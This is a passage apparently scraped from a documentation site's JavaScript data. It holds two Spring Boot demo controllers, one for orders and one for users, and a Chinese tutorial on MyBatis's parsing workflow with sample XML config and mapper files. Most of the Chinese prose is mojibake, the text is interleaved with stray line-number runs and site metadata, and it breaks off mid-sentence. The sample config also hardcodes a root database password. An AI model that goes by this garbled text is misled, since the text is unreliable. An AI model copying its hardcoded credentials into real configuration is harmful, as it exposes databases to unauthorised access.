ordercontroller\n\npackage com.example.orderserver.controller;\n\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.arrays;\nimport java.util.hashmap;\nimport java.util.list;\nimport java.util.map;\n\n/**\n * @author big uncle\n * @date 2020/3/20 11:33\n * @module hyq_app\n **/\n@restcontroller\n@requestmapping("order")\npublic class ordercontroller {\n\n    map<string,list<string>> map = new hashmap<string,list<string>>(10){{\n        put("1",arrays.aslist("userid:1 orderid:1","userid:1 orderid:2","userid:1 orderid:3","userid:1 orderid:4"));\n        put("2",arrays.aslist("userid:2 orderid:10","userid:2 orderid:12","userid:2 orderid:13","userid:2 orderid:14"));\n        put("3",arrays.aslist("userid:3 orderid:20","userid:3 orderid:22","userid:3 orderid:23","userid:3 orderid:24"));\n    }};\n\n\n    @getmapping("/getorder/{userid}")\n    public list<string> getorder(@pathvariable string userid){\n        return map.get(userid);\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\ndemo-user-server ordercontroller\n\npackage com.example.userserver.controller;\n\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.requestparam;\nimport org.springframework.web.bind.annotation.restcontroller;\nimport org.springframework.web.client.resttemplate;\n\nimport java.util.list;\n\n/**\n * æå±y-apiæ¨¡å\n * æ¨¡åæè¿°\n *\n * @author big uncle\n * @date 2020/3/20 11:24\n * @module hyq_app\n **/\n@restcontroller\n@requestmapping("user")\npublic class usercontroller {\n\n    private resttemplate resttemplate;\n\n    @autowired\n    public usercontroller(resttemplate resttemplate) {\n        this.resttemplate = resttemplate;\n    }\n\n\n    @getmapping("/getmyorder")\n    public list<string> getmyorder(@requestparam("userid") string userid){\n        list<string> list = resttemplate.getforobject("http://order-server/order/getorder/" + userid, list.class);\n        return list;\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# å¯å¨\n\n\n\n\n# è®¿é®ç»æ:\n\n',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ å·¥ä½æµç¨",frontmatter:{title:"æ ¸å¿åè½æè§£ å·¥ä½æµç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/300/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/300.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.html",relativePath:"01.æ¡æ¶/02.Mybatis/31.mybatis/300.æ ¸å¿åè½æè§£ å·¥ä½æµç¨.md",key:"v-25d7f92e",path:"/mybatis/mybatis/300/",headers:[{level:2,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:296},{level:3,title:"å è½½&è§£æXML",slug:"å è½½-è§£æxml",normalizedTitle:"å è½½ &amp; è§£æ xml",charIndex:null},{level:4,title:"Configuration åå§åéç½®",slug:"configuration-åå§åéç½®",normalizedTitle:"configuration åå§åéç½®",charIndex:2012},{level:4,title:"environments ç¯å¢è§£æ",slug:"environments-ç¯å¢è§£æ",normalizedTitle:"environments ç¯å¢è§£æ",charIndex:3823},{level:4,title:"mapper è§£æ",slug:"mapper-è§£æ",normalizedTitle:"mapper è§£æ",charIndex:4353},{level:4,title:"plugins æä»¶è§£æ",slug:"plugins-æä»¶è§£æ",normalizedTitle:"plugins æä»¶è§£æ",charIndex:6309},{level:4,title:"settings è®¾ç½®è§£æ",slug:"settings-è®¾ç½®è§£æ",normalizedTitle:"settings è®¾ç½®è§£æ",charIndex:6325},{level:2,title:"åå¤",slug:"åå¤",normalizedTitle:"åå¤",charIndex:299},{level:2,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:302}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è§£æ å è½½&è§£æXML Configuration åå§åéç½® environments ç¯å¢è§£æ mapper è§£æ plugins æä»¶è§£æ settings è®¾ç½®è§£æ åå¤ æ§è¡",content:'MyBatis æ¯ä¸ä¸ª Java ç ORM æ¡æ¶ï¼å®ä½¿ç¨ XML ææ³¨è§£æ¥éç½®åæ å° SQL è¯­å¥ï¼åæ¶æä¾äºå¢å æ¹æ¥ç­å¸¸ç¨æä½ç APIãMybatis è¿æä¾äºè®¸å¤é«çº§æ å°åæ¥è¯¢åè½ï¼ä¾å¦å»¶è¿å è½½ãç¼å­åæ¹éæä½ï¼è¿ä½¿å¾å¼åäººåå¯ä»¥è½»æ¾å°ç¼ååºé«æ§è½ãå¯ç»´æ¤çæ°æ®è®¿é®å±ã\n\nå³äº MyBatis æä»¬ä¸»è¦è¦äºè§£ä»çå·¥ä½æµç¨ï¼ç¹æ§ï¼åé¨åéè¦çç¥è¯ç¹ï¼å°±å Springï¼æä»¬ä¸»è¦æ¯äºè§£ä»ççå½å¨æï¼å¯æ©å±é¡¹ç­ï¼æè°çå½å¨æï¼ä¹æ¯ Spring çå·¥ä½æµç¨ã\n\nä»¥ä¸æ¯æ´ä¸ª MyBatis çå·¥ä½æµç¨å¾ï¼å¯¹åºå¾ä¸­ä¼è®²è§£æ¯ä¸ªèç¹éè¦çç¥è¯ç¹ãè¿éè¦è®°ä½ MyBatis ä¸»è¦çå·¥ä½æ¨¡å¼å°±æ¯è§£æãåå¤åæ§è¡ï¼æè°è§£æå°±æ¯å¾å° XML çä¿¡æ¯ï¼ç»´æ¤å°ä¸ä¸ªå« Configuration çéç½®ç±»ä¸­ï¼åå¤å°±æ¯ opensession é¨åï¼ä»ä¼å¾å° Configuration ä¸­çä¿¡æ¯ï¼æ ¹æ®æ§è¡é¨åæä½¿ç¨çæ§è¡å¨ï¼æ°æ®æºï¼äºå¡ç­è¿è¡å®ä¾ååå³ç³»æ å°ï¼ä½¿ç¨å°±æ¯å½æä»¬å»è¿è¡æ¥è¯¢ææ°å¢ç­æä½ï¼ä»èµæºåä¿¡æ¯ä¸­æ¿åå·²è¢«ç¼å­çå¯¹è±¡ææ§è¡å¨ç­ï¼æ§è¡å¯¹åºçæ¹æ³ã\n\n\n\n\n# è§£æ\n\nè§£æé¨åå¯¹åºå¾ä¸­ å è½½&è§£æXML è³ XMLConfigBuilder#mapperElement è¿éï¼å¯ä»¥è¯´æ¯è¯»å XML å°ç»´æ¤åç±»å¯¹è±¡å³ç³»åä¿¡æ¯çæ ¸å¿ãä¸é¢æä»¬åè§£è®²è§£æ¯ä¸ªæ­¥éª¤é½åäºåªäºäºæä»¥åæ ¸å¿é¨åè§£æå¾å°äºä»ä¹ã\n\n\n# å è½½ & è§£æ XML\n\nè¿é¨åä¸»è¦æ¯è¯»å mybatis-config-datasource.xml æä»¶ï¼è¯¥æä»¶ä¸»è¦ç»´æ¤äºä¸äºå¬å±èµæºä¿¡æ¯ï¼åæ¬ç¯å¢ä¿¡æ¯ï¼æ°æ®åºè¿æ¥ä¿¡æ¯ï¼ï¼å¯¹åºç mapper æä»¶ä¿¡æ¯ï¼è®¾ç½®ä¿¡æ¯ç­ã\n\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- è®¾ç½®ä¿¡æ¯ --\x3e\n    <settings>\n        \x3c!-- å¨å±ç¼å­ï¼true/false ç®¡çä¸çº§ç¼å­åäºçº§ç¼å­çæ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheEnabled" value="true"/>\n        \x3c!--ç¼å­çº§å«ï¼SESSION/STATEMENT--\x3e\n        <setting name="localCacheScope" value="STATEMENT"/>\n    </settings>\n    \x3c!-- ç¯å¢ä¿¡æ¯ --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionManager type="JDBC"/>\n            <dataSource type="POOLED">\n                <property name="driver" value="com.mysql.jdbc.Driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="Dev@root2021"/>\n            </dataSource>\n        </environment>\n    </environments>\n    \x3c!-- ç»´æ¤ææmapper --\x3e\n    <mappers>\n        \x3c!-- XML éç½® --\x3e\n        <mapper resource="mapper/Activity_Mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nè¯»åå°æä»¶åè°ç¨ XMLConfigBuilder#parse è¿è¡è§£æï¼è§£æåå®¹å¦ä¸ã\n\n# Configuration åå§åéç½®\n\nå¨æ´ä¸ªæä»¶è§£æä¹åï¼MyBatis ä¼åæä¸äºä¿¡æ¯è¿è¡æååå§åï¼ä¹å°±æ¯ä¸å¾ä¸­ new Configurationï¼ï¼ é¶æ®µï¼è¯¥ç±»æç»ä¼è¢«å¤ä¸ª MyBatis çç±»æå¼ç¨å¹¶è´¯ç©¿æ´ä¸ª MyBatis å·¥ä½æµç¨ï¼ç±äºè¢«å¼ç¨çç±»å¤ªå¤ï¼è¿éå°±ä¸ä¸ä¸åä¸¾ï¼æä»¬åªè¦ç¥éä»è´¯ç©¿æ´ä¸ªæµç¨å³å¯ã\n\n\n\nConfiguration è¢«åå§åæ¶åå«äºå¤§éçä¿¡æ¯ï¼è¿äºä¿¡æ¯å°±æ¯å¨è§£æ xml æä»¶æ¶ç»´æ¤çï¼éä¸è®²è§£ä¸æ¯ä¸ªéç½®çå·ä½ä½ç¨ï¼\n\n * environmentï¼ç¼å­äºç¯å¢ IDï¼å¯è®¾ç½®é»è®¤ç¯å¢ï¼ç¯å¢åæ¬ï¼å¼åç¯å¢ãæµè¯ç¯å¢ç­ï¼ï¼äºå¡å·¥åï¼æ°æ®æºï¼ææ± ææ æ± æå¶ä»è¿æ¥æ± ï¼ç­\n * mapperRegistryï¼æ å°æ³¨åæºï¼ç¼å­æ¯ä¸ªæ¥å£ï¼ æ¥å£å¯¹è±¡Classåä¸ºkey ï¼æå¯¹åºç MapperProxyFactory ï¼æä¾æ·»å æ å°ä»£çç±»åè·åä»£çç±»\n * mappedStatementsï¼ç¼å­ SQL è¯­å¥çæè§£ä¿¡æ¯ãXML ç namespace.æ ç­¾IDåä¸ºï¼keyï¼ ï¼value ä¸º MappedStatementï¼ä¿¡æ¯åæ¬ï¼ mapperè·¯å¾ ï¼ SQLç±»åï¼SELECT|INSERTç­ï¼ ï¼ SQLè¯­å¥ ï¼ æ¡ä»¶ ï¼ è¯¥æ¡è¯­å¥çç¼å­ä¿¡æ¯ ï¼ è¿åç»æå¯¹è±¡ ï¼ æ¯å¦ç¼å­æ å¿ ç­ã\n * resultMapsï¼ç¼å­ resultMap æ ç­¾çæè§£ä¿¡æ¯ãXML ç namespace.resultMapåä¸ºï¼keyï¼ ï¼ç¶åå¯¹åº value å­æ¾ SQLå­æ®µï¼æ å°å¯¹è±¡å­æ®µï¼å­æ®µJAVAæ°æ®ç±»åï¼ç±»åå¯¹åºçæ§è¡å¨ ç­\n * interceptorChainï¼ç¼å­ plugins æ ç­¾çæè§£ä¿¡æ¯ãä¼å¨æ§è¡ newParameterHandlerï¼newResultSetHandlerï¼newStatementHandlerï¼newExecutor è¿è¡æ¦æªã\n * typeAliasRegistryï¼ç¼å­äºæ¯ä¸ª java åºæ¬ç±»åçå°è£ç±»ï¼ä»¥å JdbcTransactionFactoryï¼DruidDataSourceFactoryï¼UnpooledDataSourceFactoryï¼PooledDataSourceFactoryï¼PerpetualCacheï¼FifoCache ç­ Mybatis æä¾çå·²ç¥ç±»ï¼ç¨äºå¿«éè§£æ XML æè¿°çå¼ï¼ä¾¿äºå¿«éå¾å° Class ä¿¡æ¯å¹¶è·åå®ä¾ã\n * typeHandlerRegistryï¼å­æ¾å¯¹åºæ°æ®ç±»åçå¤çç­ç¥ï¼æ¯å¦ JAVA ç±»åï¼å¯¹åº SQL ç±»åçå¤çç­ç¥ï¼æ JAVA ç±»åå¯¹åºçå¤çç­ç¥ãç¨äºè®¾ç½® SQL è¯­å¥åæ°åè·åæ¥è¯¢ç»æçæ°æ®ç±»åè½¬æ¢ç­ç¥ã\n * objectFactoryï¼å¯¹è±¡å·¥åï¼ç¨äºåå»ºå¯¹è±¡å®ä¾ï¼ä½¿ç¨åå°ã\n * objectWrapperFactoryï¼å¯¹è±¡åè£å¨ï¼æ¾çï¼è¢«è§£æå¯¹è±¡çå®ä¾ï¼ä»¥åå¯¹åºç setï¼getï¼æé å¨ï¼ç±»åç­ä¿¡æ¯ã objectFactory ä¸ objectWrapperFactory æ¯ä¸º MetaObject æä¾æ¯æçï¼ä»¥è§£æå¯¹è±¡ä¿¡æ¯è¿è¡ï¼ç¶åè·åå¯¹è±¡æä¸ªç¹å®å±æ§çæ°æ®ï¼ç¼å­æ¯ä¸ºäºå å¿«è·åéåº¦ï¼å¦æå±æ§ä¹æ¯ä¸ä¸ªå¯¹è±¡åä¼éå½ç¼å­ï¼è·åå¼ä¹ä¼éå½è·åã\n * loadedResourcesï¼å­æ¾å·²è¢«å è½½ç mapper.xml æä»¶ï¼ä»¥é²æ­¢éå¤å è½½\n * languageRegistryï¼å­æ¾é»è®¤çè¯­è¨è§£æé©±å¨å¨ï¼æ¯å¦å­æ¾äº XMLLanguageDriver ï¼æä¾å¿«éè·åè¿ä¸ªè§£æå¨ï¼ç¶åæä¾ SQL è§£æã\n * cacheEnabledï¼è§£ææ¯å¦å¯ç¨ç¼å­ï¼è¯¥éç½®å¯¹äºäºçº§ç¼å­çæï¼ä¸æ¬¡ç¼å­æ¯é»è®¤ç¼å­ã\n * localCacheScopeï¼ä¸çº§ç¼å­ï¼ç¼å­ç­ç¥é»è®¤æ¯æ°¸ä¹ç¼å­ï¼ç¼å­æ¹å¼åä¸º SESSION å STATEMENT ï¼ SESSION å¨è¯¥ä¼è¯ä¸­å½ä¸­ç¸å sql è¯­å¥åæ¡ä»¶ï¼è¥å¨è¯¥ SESSION ä¸­åç insert/update/delete/commit/rollback/close åä¼æ¸é¤ç¼å­ï¼ä½æ¯ï¼å¹¶ä¸ä¼å½±åå¶å®ä¼è¯ä¸­çç¼å­ï¼ STATEMENT ï¼åªéå¯¹å½åä¼è¯æ§è¡çè¿ä¸è¯­å¥ææï¼æ§è¡å®æ¯æ¥è¯¢ä¼ç«å³æ¸é¤ç¼å­ã\n * cachesï¼äºçº§ç¼å­ï¼åºäº namespace çç¼å­ï¼å¯æä¾ç¬¬ä¸æ¹å¶ä»æ¹å¼å®ç°ã\n\n# environments ç¯å¢è§£æ\n\nå¨ç¯å¢è§£æè¿ç¨ä¸­ä¼å¾å°ä¸é¢å ä¸ªéè¦çå±æ§ï¼\n\n * IDï¼è¡¨æä½¿ç¨åªä¸ä¸ªç¯å¢åä¸ºä¸»è¦ç¯å¢éç½®ï¼è§£æ XML ä¸­ç <environment > æ ç­¾\n * TransactionFactoryï¼è§£æ XML ä¸­ç <transactionManager> ç type å±æ§ï¼å¦ææ¯ JDBC åå°±æ¯ JdbcTransactionFactory ï¼ä¹å¯ä»¥èªè¡è®¾ç½®ï¼éè¦èªå·±æ³¨åå° typeAliasRegistry ä¸­\n * DataSourceFactoryï¼è§£æ XML ä¸­ <dataSource> ç type å±æ§ï¼å¦ææ¯ POOLED ï¼åå¯¹åº PooledDataSourceFactory ï¼ UNPOOLED å¯¹åº UnpooledDataSourceFactory ï¼ DRUID å¯¹åº DruidDataSourceFactory\n * DataSourceï¼è§£æ XML ä¸­ <property> å¾å°å·ä½çè¿æ¥ä¿¡æ¯ï¼ä» DataSourceFactory ä¸­è·å DataSource\n\nå½ä»¥ä¸çä¿¡æ¯ç»ä»¶å®æ¯åä¼å°è£å° Environment ä¸­ï¼ç¶åæ·»å å° configuration\n\n# mapper è§£æ\n\nå¨ mapper è§£æä¸­æä¸¤ç§ä¸åçè§£æï¼ä¸ä¸ªæ¯æä»¬å¸¸è§ç XML è§£æï¼ä¸ç§æ¯æ³¨è§£ï¼å¦ @selectï¼è¿éåªè®² XML è§£æï¼æå³ @select ç­æ³¨è§£è§£æï¼æ¾å¨åç»­ä¸å¼ä¸ç« ãé£è§£æé¦åä¼è¯»åæå°ææç mapperï¼å¨åå«è§£ææ¯ä¸ª mapper\n\n<mappers>\n    \x3c!-- XML éç½® --\x3e\n    <mapper resource="mapper/Activity_Mapper.xml"/>\n</mappers>\n\n\n1\n2\n3\n4\n\n\nä¸ä¸ªå®æ´ç Mapper å¤§è´åå«å¦ä¸ä¿¡æ¯ï¼æä»¥åé¨ä¼æå¤ä¸ªè§£æåå«è§£æï¼å¦ cache è§£æï¼resultMap è§£æï¼select è§£æï¼insert è§£æç­ï¼æä»¬è¿éè¯´ä¸éè¦çè§£æå¯¹è±¡åä½ç¨å³å¯ã\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.IActivityDao">\n    <cache eviction="FIFO" flushInterval="600000" size="512" readOnly="true"/>\n    <resultMap id="activityMap" type="cn.bugstack.mybatis.test.po.Activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityId"/>\n        <result column="activity_name" property="activityName"/>\n        <result column="activity_desc" property="activityDesc"/>\n        <result column="create_time" property="createTime"/>\n        <result column="update_time" property="updateTime"/>\n    </resultMap>\n    <select id="queryActivityById" parameterType="cn.bugstack.mybatis.test.po.Activity" resultMap="activityMap" flushCache="false" useCache="true">\n        SELECT activity_id, activity_name, activity_desc, create_time, update_time\n        FROM activity\n        <trim prefix="where" prefixOverrides="AND | OR" suffixOverrides="and">\n            <if test="null != activityId">\n                activity_id = #{activityId}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > æ ç­¾éç½®äºäºçº§ç¼å­ï¼å¯¹äºç¼å­ä¹ä¼æåç¬çä¸ç« è®²è§£ï¼è¿éåªè®²è§£æå¾å°çéè¦ç±»åä½ç¨ï¼éè¿æ ç­¾ä¼å°è£ä¸ä¸ª Cache å¯¹è±¡ï¼è¯¥å¯¹è±¡ä»¥ namespace åä¸º cache ç Id ï¼å¹¶æ Cache å¯¹è±¡æ·»å å° configuration ä¸­\n\n<resultMap> æ ç­¾éç½®ä¸ä¸ª <select > æ ç­¾ç resultMap å±æ§è¿åç»æå¯¹è±¡çå³ç³»æ å°ï¼ä»ä¼å¾å°å¯¹è±¡ä»¥åå¾å°æè¿°çå java å±æ§ç±»ååå¯¹åºç TypeHandler ç±»åå¤çå¨ï¼å¨è¿åçæ¶åä½¿ç¨ç±»åå¤çå¨ï¼å¤çæ¥è¯¢è¿åç»æçæ°æ®ç±»åå¯¹åº java çæ å°ã <resultMap> æ ç­¾å¯ä»¥æå¤ä¸ªï¼æä»¥ä¼æ·»å å°éåä¸­ï¼ç¶åç»´æ¤å° configuration ä¸­\n\n<select> or <insert> è¿éæä¸»è¦çé¨åå°±æ¯å¨è§£æå®æåä¼æ namespace.id åä¸º key ï¼æè§£æçä¿¡æ¯ MappedStatement åä¸º value ï¼ç»´æ¤å° configuration ä¸­ï¼ä»¥ä¾¿ Mybatis å¨è¢«ä»£çç±»è°ç¨æ¹æ³çæ¶åå¿«éæ¾å°ï¼è¯¥æ¹æ³å¯¹åºç SQL ä¿¡æ¯ç­\n\n# plugins æä»¶è§£æ\n\n# settings è®¾ç½®è§£æ\n\n\n# åå¤\n\n\n# æ§è¡',normalizedContent:'mybatis æ¯ä¸ä¸ª java ç orm æ¡æ¶ï¼å®ä½¿ç¨ xml ææ³¨è§£æ¥éç½®åæ å° sql è¯­å¥ï¼åæ¶æä¾äºå¢å æ¹æ¥ç­å¸¸ç¨æä½ç apiãmybatis è¿æä¾äºè®¸å¤é«çº§æ å°åæ¥è¯¢åè½ï¼ä¾å¦å»¶è¿å è½½ãç¼å­åæ¹éæä½ï¼è¿ä½¿å¾å¼åäººåå¯ä»¥è½»æ¾å°ç¼ååºé«æ§è½ãå¯ç»´æ¤çæ°æ®è®¿é®å±ã\n\nå³äº mybatis æä»¬ä¸»è¦è¦äºè§£ä»çå·¥ä½æµç¨ï¼ç¹æ§ï¼åé¨åéè¦çç¥è¯ç¹ï¼å°±å springï¼æä»¬ä¸»è¦æ¯äºè§£ä»ççå½å¨æï¼å¯æ©å±é¡¹ç­ï¼æè°çå½å¨æï¼ä¹æ¯ spring çå·¥ä½æµç¨ã\n\nä»¥ä¸æ¯æ´ä¸ª mybatis çå·¥ä½æµç¨å¾ï¼å¯¹åºå¾ä¸­ä¼è®²è§£æ¯ä¸ªèç¹éè¦çç¥è¯ç¹ãè¿éè¦è®°ä½ mybatis ä¸»è¦çå·¥ä½æ¨¡å¼å°±æ¯è§£æãåå¤åæ§è¡ï¼æè°è§£æå°±æ¯å¾å° xml çä¿¡æ¯ï¼ç»´æ¤å°ä¸ä¸ªå« configuration çéç½®ç±»ä¸­ï¼åå¤å°±æ¯ opensession é¨åï¼ä»ä¼å¾å° configuration ä¸­çä¿¡æ¯ï¼æ ¹æ®æ§è¡é¨åæä½¿ç¨çæ§è¡å¨ï¼æ°æ®æºï¼äºå¡ç­è¿è¡å®ä¾ååå³ç³»æ å°ï¼ä½¿ç¨å°±æ¯å½æä»¬å»è¿è¡æ¥è¯¢ææ°å¢ç­æä½ï¼ä»èµæºåä¿¡æ¯ä¸­æ¿åå·²è¢«ç¼å­çå¯¹è±¡ææ§è¡å¨ç­ï¼æ§è¡å¯¹åºçæ¹æ³ã\n\n\n\n\n# è§£æ\n\nè§£æé¨åå¯¹åºå¾ä¸­ å è½½&è§£æxml è³ xmlconfigbuilder#mapperelement è¿éï¼å¯ä»¥è¯´æ¯è¯»å xml å°ç»´æ¤åç±»å¯¹è±¡å³ç³»åä¿¡æ¯çæ ¸å¿ãä¸é¢æä»¬åè§£è®²è§£æ¯ä¸ªæ­¥éª¤é½åäºåªäºäºæä»¥åæ ¸å¿é¨åè§£æå¾å°äºä»ä¹ã\n\n\n# å è½½ & è§£æ xml\n\nè¿é¨åä¸»è¦æ¯è¯»å mybatis-config-datasource.xml æä»¶ï¼è¯¥æä»¶ä¸»è¦ç»´æ¤äºä¸äºå¬å±èµæºä¿¡æ¯ï¼åæ¬ç¯å¢ä¿¡æ¯ï¼æ°æ®åºè¿æ¥ä¿¡æ¯ï¼ï¼å¯¹åºç mapper æä»¶ä¿¡æ¯ï¼è®¾ç½®ä¿¡æ¯ç­ã\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype configuration public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- è®¾ç½®ä¿¡æ¯ --\x3e\n    <settings>\n        \x3c!-- å¨å±ç¼å­ï¼true/false ç®¡çä¸çº§ç¼å­åäºçº§ç¼å­çæ¯å¦ä½¿ç¨ --\x3e\n        <setting name="cacheenabled" value="true"/>\n        \x3c!--ç¼å­çº§å«ï¼session/statement--\x3e\n        <setting name="localcachescope" value="statement"/>\n    </settings>\n    \x3c!-- ç¯å¢ä¿¡æ¯ --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionmanager type="jdbc"/>\n            <datasource type="pooled">\n                <property name="driver" value="com.mysql.jdbc.driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useunicode=true&amp;characterencoding=utf8&amp;usessl=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="dev@root2021"/>\n            </datasource>\n        </environment>\n    </environments>\n    \x3c!-- ç»´æ¤ææmapper --\x3e\n    <mappers>\n        \x3c!-- xml éç½® --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nè¯»åå°æä»¶åè°ç¨ xmlconfigbuilder#parse è¿è¡è§£æï¼è§£æåå®¹å¦ä¸ã\n\n# configuration åå§åéç½®\n\nå¨æ´ä¸ªæä»¶è§£æä¹åï¼mybatis ä¼åæä¸äºä¿¡æ¯è¿è¡æååå§åï¼ä¹å°±æ¯ä¸å¾ä¸­ new configurationï¼ï¼ é¶æ®µï¼è¯¥ç±»æç»ä¼è¢«å¤ä¸ª mybatis çç±»æå¼ç¨å¹¶è´¯ç©¿æ´ä¸ª mybatis å·¥ä½æµç¨ï¼ç±äºè¢«å¼ç¨çç±»å¤ªå¤ï¼è¿éå°±ä¸ä¸ä¸åä¸¾ï¼æä»¬åªè¦ç¥éä»è´¯ç©¿æ´ä¸ªæµç¨å³å¯ã\n\n\n\nconfiguration è¢«åå§åæ¶åå«äºå¤§éçä¿¡æ¯ï¼è¿äºä¿¡æ¯å°±æ¯å¨è§£æ xml æä»¶æ¶ç»´æ¤çï¼éä¸è®²è§£ä¸æ¯ä¸ªéç½®çå·ä½ä½ç¨ï¼\n\n * environmentï¼ç¼å­äºç¯å¢ idï¼å¯è®¾ç½®é»è®¤ç¯å¢ï¼ç¯å¢åæ¬ï¼å¼åç¯å¢ãæµè¯ç¯å¢ç­ï¼ï¼äºå¡å·¥åï¼æ°æ®æºï¼ææ± ææ æ± æå¶ä»è¿æ¥æ± ï¼ç­\n * mapperregistryï¼æ å°æ³¨åæºï¼ç¼å­æ¯ä¸ªæ¥å£ï¼ æ¥å£å¯¹è±¡classåä¸ºkey ï¼æå¯¹åºç mapperproxyfactory ï¼æä¾æ·»å æ å°ä»£çç±»åè·åä»£çç±»\n * mappedstatementsï¼ç¼å­ sql è¯­å¥çæè§£ä¿¡æ¯ãxml ç namespace.æ ç­¾idåä¸ºï¼keyï¼ ï¼value ä¸º mappedstatementï¼ä¿¡æ¯åæ¬ï¼ mapperè·¯å¾ ï¼ sqlç±»åï¼select|insertç­ï¼ ï¼ sqlè¯­å¥ ï¼ æ¡ä»¶ ï¼ è¯¥æ¡è¯­å¥çç¼å­ä¿¡æ¯ ï¼ è¿åç»æå¯¹è±¡ ï¼ æ¯å¦ç¼å­æ å¿ ç­ã\n * resultmapsï¼ç¼å­ resultmap æ ç­¾çæè§£ä¿¡æ¯ãxml ç namespace.resultmapåä¸ºï¼keyï¼ ï¼ç¶åå¯¹åº value å­æ¾ sqlå­æ®µï¼æ å°å¯¹è±¡å­æ®µï¼å­æ®µjavaæ°æ®ç±»åï¼ç±»åå¯¹åºçæ§è¡å¨ ç­\n * interceptorchainï¼ç¼å­ plugins æ ç­¾çæè§£ä¿¡æ¯ãä¼å¨æ§è¡ newparameterhandlerï¼newresultsethandlerï¼newstatementhandlerï¼newexecutor è¿è¡æ¦æªã\n * typealiasregistryï¼ç¼å­äºæ¯ä¸ª java åºæ¬ç±»åçå°è£ç±»ï¼ä»¥å jdbctransactionfactoryï¼druiddatasourcefactoryï¼unpooleddatasourcefactoryï¼pooleddatasourcefactoryï¼perpetualcacheï¼fifocache ç­ mybatis æä¾çå·²ç¥ç±»ï¼ç¨äºå¿«éè§£æ xml æè¿°çå¼ï¼ä¾¿äºå¿«éå¾å° class ä¿¡æ¯å¹¶è·åå®ä¾ã\n * typehandlerregistryï¼å­æ¾å¯¹åºæ°æ®ç±»åçå¤çç­ç¥ï¼æ¯å¦ java ç±»åï¼å¯¹åº sql ç±»åçå¤çç­ç¥ï¼æ java ç±»åå¯¹åºçå¤çç­ç¥ãç¨äºè®¾ç½® sql è¯­å¥åæ°åè·åæ¥è¯¢ç»æçæ°æ®ç±»åè½¬æ¢ç­ç¥ã\n * objectfactoryï¼å¯¹è±¡å·¥åï¼ç¨äºåå»ºå¯¹è±¡å®ä¾ï¼ä½¿ç¨åå°ã\n * objectwrapperfactoryï¼å¯¹è±¡åè£å¨ï¼æ¾çï¼è¢«è§£æå¯¹è±¡çå®ä¾ï¼ä»¥åå¯¹åºç setï¼getï¼æé å¨ï¼ç±»åç­ä¿¡æ¯ã objectfactory ä¸ objectwrapperfactory æ¯ä¸º metaobject æä¾æ¯æçï¼ä»¥è§£æå¯¹è±¡ä¿¡æ¯è¿è¡ï¼ç¶åè·åå¯¹è±¡æä¸ªç¹å®å±æ§çæ°æ®ï¼ç¼å­æ¯ä¸ºäºå å¿«è·åéåº¦ï¼å¦æå±æ§ä¹æ¯ä¸ä¸ªå¯¹è±¡åä¼éå½ç¼å­ï¼è·åå¼ä¹ä¼éå½è·åã\n * loadedresourcesï¼å­æ¾å·²è¢«å è½½ç mapper.xml æä»¶ï¼ä»¥é²æ­¢éå¤å è½½\n * languageregistryï¼å­æ¾é»è®¤çè¯­è¨è§£æé©±å¨å¨ï¼æ¯å¦å­æ¾äº xmllanguagedriver ï¼æä¾å¿«éè·åè¿ä¸ªè§£æå¨ï¼ç¶åæä¾ sql è§£æã\n * cacheenabledï¼è§£ææ¯å¦å¯ç¨ç¼å­ï¼è¯¥éç½®å¯¹äºäºçº§ç¼å­çæï¼ä¸æ¬¡ç¼å­æ¯é»è®¤ç¼å­ã\n * localcachescopeï¼ä¸çº§ç¼å­ï¼ç¼å­ç­ç¥é»è®¤æ¯æ°¸ä¹